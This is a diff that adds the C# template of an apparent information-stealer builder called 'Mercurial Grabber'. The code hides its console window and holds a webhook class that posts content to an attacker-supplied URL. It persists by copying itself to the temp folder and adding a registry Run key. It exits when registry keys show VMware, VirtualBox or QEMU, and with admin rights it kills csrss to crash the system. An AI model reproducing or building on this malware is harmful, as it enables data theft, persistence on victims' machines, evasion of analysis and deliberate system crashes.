@@ -1,0 +1,178 @@
+﻿using System;
+using System.Collections.Generic;
+using System.IO;
+using System.Text.RegularExpressions;
+using System.Drawing;
+using System.Drawing.Imaging;
+using System.Windows.Forms;
+using Microsoft.Win32;
+using System.Diagnostics;
+using System.Threading;
+using System.Net.Http;
+using System.Net;
+using System.Runtime.InteropServices;
+using System.Security.Principal;
+using System.Reflection;
+
+namespace GrabberBuilderCODE
+{
+    class Program
+    {
+        [DllImport("kernel32.dll")]
+        static extern IntPtr GetConsoleWindow();
+
+        [DllImport("user32.dll")]
+        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+
+        const int SW_HIDE = 0;
+        const int SW_SHOW = 5;
+
+        public static List<string> target = new List<string>();
+
+        static void Main()
+        {
+            try
+            {
+                var handle = GetConsoleWindow();
+                ShowWindow(handle, SW_HIDE);
+            }
+
+            catch
+            {
+
+            }
+            Webhook wh = new Webhook("%INSERT_WEBHOOK%");
+            %JUMP%
+            %STARTUP%
+            %ANTIVM%
+            %BSOD%
+             
+
+
+
+        }
+
+        static void jumpscare()
+        {
+            Process.Start("https://youtu.be/qbTSL2FY9yc");
+        }
+
+        public static void startup()
+        {
+            try
+            {
+                string filename = Process.GetCurrentProcess().ProcessName + ".exe";
+                string filepath = Path.Combine(Environment.CurrentDirectory, filename);
+                File.Copy(filepath, Path.GetTempPath() + filename);
+
+                string loc = Path.GetTempPath() + filename;
+
+                using (RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true))
+                {
+                    key.SetValue("Mercurial Grabber", "\"" + loc + "\"");
+                }
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine(ex.Message);
+            }
+        }
+
+
+        static void DetectRegistry()
+        {
+            List<string> EvidenceOfSandbox = new List<string>();
+
+            List<string> sandboxStrings = new List<string> { "vmware", "virtualbox", "vbox", "qemu", "xen" };
+
+            string[] HKLM_Keys_To_Check_Exist = {@"HARDWARE\DEVICEMAP\Scsi\Scsi Port 2\Scsi Bus 0\Target Id 0\Logical Unit Id 0\Identifier",
+                @"SYSTEM\CurrentControlSet\Enum\SCSI\Disk&Ven_VMware_&Prod_VMware_Virtual_S",
+                @"SYSTEM\CurrentControlSet\Control\CriticalDeviceDatabase\root#vmwvmcihostdev",
+                @"SYSTEM\CurrentControlSet\Control\VirtualDeviceDrivers",
+                @"SOFTWARE\VMWare, Inc.\VMWare Tools",
+                @"SOFTWARE\Oracle\VirtualBox Guest Additions",
+                @"HARDWARE\ACPI\DSDT\VBOX_"};
+
+            string[] HKLM_Keys_With_Values_To_Parse = {@"SYSTEM\ControlSet001\Services\Disk\Enum\0",
+                @"HARDWARE\Description\System\SystemBiosInformation",
+                @"HARDWARE\Description\System\VideoBiosVersion",
+                @"HARDWARE\Description\System\SystemManufacturer",
+                @"HARDWARE\Description\System\SystemProductName",
+                @"HARDWARE\Description\System\Logical Unit Id 0"};
+
+            foreach (string HKLM_Key in HKLM_Keys_To_Check_Exist)
+            {
+                RegistryKey OpenedKey = Registry.LocalMachine.OpenSubKey(HKLM_Key, false);
+                if (OpenedKey != null)
+                {
+                    EvidenceOfSandbox.Add(@"HKLM:\" + HKLM_Key);
+                }
+            }
+
+            foreach (string HKLM_Key in HKLM_Keys_With_Values_To_Parse)
+            {
+                string valueName = new DirectoryInfo(HKLM_Key).Name;
+                string value = (string)Registry.LocalMachine.OpenSubKey(Path.GetDirectoryName(HKLM_Key), false).GetValue(valueName);
+                foreach (string sandboxString in sandboxStrings)
+                {
+                    if (!string.IsNullOrEmpty(value) && value.ToLower().Contains(sandboxString.ToLower()))
+                    {
+                        EvidenceOfSandbox.Add(@"HKLM:\" + HKLM_Key + " => " + value);
+                    }
+                }
+            }
+
+            if (EvidenceOfSandbox.Count == 0)
+            {
+                return;
+            }
+
+            Environment.Exit(0);
+        }
+
+
+
+
+
+        public static void bsod()
+        {
+            if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator)) return;
+
+            System.Diagnostics.Process.GetProcessesByName("csrss")[0].Kill();
+        }
+
+        
+
+
+
+        
+
+
+        class Webhook
+        {
+            private string webhook;
+            public Webhook(string userWebhook)
+            {
+                webhook = userWebhook;
+            }
+            public void Send(string content)
+            {
+                Dictionary<string, string> data = new Dictionary<string, string>
+            {
+                {"content", content }
+            };
+                try
+                {
+                    using (HttpClient client = new HttpClient())
+                    {
+                        client.PostAsync(webhook, new FormUrlEncodedContent(data)).GetAwaiter().GetResult();
+                    }
+                }
+                catch
+                {
+                }
+
+            }
+        }
+    }
+}
